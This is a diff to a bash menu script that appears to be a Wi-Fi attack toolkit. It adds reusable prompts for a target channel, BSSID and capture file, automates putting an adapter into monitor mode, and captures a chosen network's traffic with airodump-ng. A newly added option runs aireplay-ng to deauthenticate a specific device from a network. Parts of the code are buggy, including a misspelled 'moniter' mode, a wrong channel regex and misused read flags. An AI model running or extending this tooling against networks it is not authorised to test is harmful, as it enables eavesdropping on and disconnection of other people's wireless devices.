@@ -160,7 +160,7 @@ elif [ "$NETWORK" == "exit" ]
 then
 exec bash "$0" "$@"
 fi
-ifconfig "$NETWORK" > /dev/null 2>&1 && VALUE1=2
+ifconfig "$NETWORK" down > /dev/null 2>&1 && VALUE1=2
 if [ "$VALUE1" == 2 ]
 then
 VALUE1=1
@@ -171,7 +171,7 @@ echo "Network adapter not found"
 sleep 2
 Network-Scan
 fi
-iwconfig "$NETWORK" mode moniter > /dev/null 2>&1 && VALUE2=2
+iwconfig "$NETWORK" mode moniter> /dev/null 2>&1 && VALUE2=2
 if [ "$VALUE2" == 2 ]
 then
 VALUE2=1
@@ -193,28 +193,81 @@ read -n 1 -r -s -p "Press any key to continue..."
 clear
 exec bash "$0" "$@"
 }
-
-
-
-
-
-
-
-
-
-
-
+Read-Channel-1() {
+echo ""
+read -p "Enter channel of network: " CHANNEL
+if [ -z "$CHANNEL" ]
+then
+echo ""
+echo "Cannot leave blank"
+sleep 2
+Read-Channel-1
+fi
+if ! [[ "$CHANNEL" =~ ^[0-13]+$ ]]
+then
+echo ""
+echo "Not a channel"
+sleep 2
+Read-Channel-1
+fi
+}
+Read-BSSID-1() {
+echo ""
+read -p "Enter BSSID of network: " BSSID
+BSSID_LENGTH_1=${#BSSID}
+if [ -z "$BSSID" ]
+then
+echo ""
+echo "Cannot leave blank"
+sleep 2
+Read-BSSID-1
+elif [ "$BSSID_LENGTH_1" -ne 17 ]
+then
+echo ""
+echo "Not a valid BSSID"
+sleep 2
+Read-BSSID-1
+fi
+}
+Read-Filename-1() {
+echo ""
+read -p "Enter a file name for capture: " FILE
+if [ -z "$FILE" ]
+then
+echo ""
+echo "Cannot leave blank"
+sleep 2
+Read-Filename-1
+elif [[ $FILE == *"."* ]]
+then
+echo ""
+echo "File name cannot contain a period"
+sleep 2
+Read-Filename-1
+fi
+}
 Packet-Collect() {
 clear
 echo "Capture packets from selected network"
 echo ""
 echo "-During scan press CTRL+C to stop"
+echo "-Type "exit" to return to main menue"
 echo ""
 echo "===================================================================="
 iwconfig
 echo "===================================================================="
 echo ""
 read -p "Enter name of your network adapter: " NETWORK
+if [ -z "$NETWORK" ]
+then
+echo ""
+echo "Cannot leave blank"
+sleep 2
+Packet-Collect
+elif [ "$NETWORK" == "exit" ]
+then
+exec bash "$0" "$@"
+fi
 ifconfig "$NETWORK" > /dev/null 2>&1 && VALUE1=2
 if [ "$VALUE1" == 2 ]
 then
@@ -224,9 +277,9 @@ sleep 1
 echo ""
 echo "Network adapter not found"
 sleep 2
-managed-mode
+Packet-Collect
 fi
-iwconfig "$NETWORK" mode moniter> /dev/null 2>&1 && VALUE2=2
+iwconfig "$NETWORK" mode moniter > /dev/null 2>&1 && VALUE2=2
 if [ "$VALUE2" == 2 ]
 then
 VALUE2=1
@@ -235,46 +288,20 @@ sleep 1
 echo ""
 echo "Network adapter invalid"
 sleep 2
-moniter-mode
+Packet-Collect
 fi
 ifconfig "$NETWORK" down
 iwconfig "$NETWORK" mode monitor
 ifconfig "$NETWORK" up
-echo "Changed to monitor mode"
 echo ""
 read -n 1 -r -s -p "Press any key to begin scan..."
 airodump-ng "$NETWORK"
+echo "================================================================================"
 echo ""
-read -p "Enter channel of network: " CHANNEL
-if [ -z "$CHANNEL" ]
-then
+Read-Channel-1
+Read-BSSID-1
+Read-Filename-1
 echo ""
-echo "Channel"
-sleep 2
-exec bash "$0" "$@"
-else
-read -p "Enter BSSID of network: " BSSID
-if [ -z "$BSSID" ]
-then
-echo ""
-echo "Invalid BSSID"
-sleep 2
-exec bash "$0" "$@"
-else
-read -p "Enter a file name for capture: " FILE
-if [ -z "$FILE" ]
-then
-echo ""
-echo "Invalid File Name"
-sleep 2
-exec bash "$0" "$@"
-elif [ $FILE == *"."* ]
-then
-echo ""
-echo "File name cannot contain ".""
-sleep 2
-Packet-Collect
-else
 read -n 1 -s -r -p "Press any key to start capture..."
 airodump-ng "$NETWORK" --channel "$CHANNEL" --bssid "$BSSID" --write "$FILE"
 echo ""
@@ -288,10 +315,22 @@ echo "File cleaned"
 echo "File moved"
 read -n 1 -r -s -p "Press any key to continue..."
 exec "$0" "$@"
-fi
-fi
-fi
 }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -449,6 +488,32 @@ fi
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 clear
 echo "              _       ____            _       _   "
 echo "   __ _ _   _| |_ ___/ ___|  ___ _ __(_)_ __ | |_ "
@@ -572,9 +637,102 @@ exec bash "$0" "$@"
 
 elif [ $ATTACK2 == 3 ]
 then
+clear
+echo "Deauth a specific device on a network"
 echo ""
-echo "Coming soon..."
+echo "-Type "exit" to return to main menue"
+echo ""
+echo "======================================================================="
+iwconfig
+echo "======================================================================="
+echo ""
+read -p "Enter the name of your network adapter: " NETWORK
+if [ -z "$NETWORK" ]
+then
+echo ""
+echo "Cannot leave blank"
 sleep 2
+exec bash "$0" "$@"
+elif [ "$NETWORK" == "exit" ]
+then
+exec bash "$0" "$@"
+fi
+ifconfig "$NETWORK" down > /dev/null 2>&1 && VALUE1=2
+if [ "$VALUE1" == 2 ]
+then
+VALUE1=1
+else
+sleep 1
+echo ""
+echo "Network adapter not found"
+sleep 2
+exec bash "$0" "$@"
+fi
+iwconfig "$NETWORK" mode moniter> /dev/null 2>&1 && VALUE2=2
+if [ "$VALUE2" == 2 ]
+then
+VALUE2=1
+else
+sleep 1
+echo ""
+echo "Network adapter invalid"
+sleep 2
+exec bash "$0" "$@"
+fi
+read -n 1 -s -r -p "Press any key to begin scan..."
+airodump-ng "$NETWORK"
+echo ""
+read -p "Enter channel of network: " CHANNEL
+if [ -z "$CHANNEL" ]
+then
+echo ""
+echo "Cannot leave blank"
+sleep 2
+exec bash "$0" "$@"
+fi
+if ! [[ "$CHANNEL" =~ ^[0-13]+$ ]]
+then
+echo ""
+echo "Not a channel"
+sleep 2
+exec bash "$0" "$@"
+fi
+airodump-ng "$NETWORK" -c "$CHANNEL"
+echo ""
+read -p "Enter BSSID of Network: " BSSID_Network
+BSSID_LENGTH_1=${#BSSID_Network}
+if [ -z "$BSSID_Network" ]
+then
+echo ""
+echo "Cannot leave blank"
+sleep 2
+exec bash "$0" "$@"
+elif [ "$BSSID_LENGTH_1" -ne 17 ]
+then
+echo ""
+echo "Not a valid BSSID"
+sleep 2
+exec bash "$0" "$@"
+fi
+read -p "Enter BSSID of device: " BSSID_Device
+BSSID_LENGTH_1=${#BSSID_Device}
+if [ -z "$BSSID_Device" ]
+then
+echo ""
+echo "Cannot leave blank"
+sleep 2
+exec bash "$0" "$@"
+elif [ "$BSSID_LENGTH_1" -ne 17 ]
+then
+echo ""
+echo "Not a valid BSSID"
+sleep 2
+exec bash "$0" "$@"
+fi
+echo ""
+aireplay-ng -0 1 -a "$BSSID_Network" -c "$BSSID_Device" "$NETWORK"
+echo ""
+read -p -n 1 -r -s "Press any key to continue..."
 exec bash "$0" "$@"
 
 elif [ $ATTACK2 == 4 ]
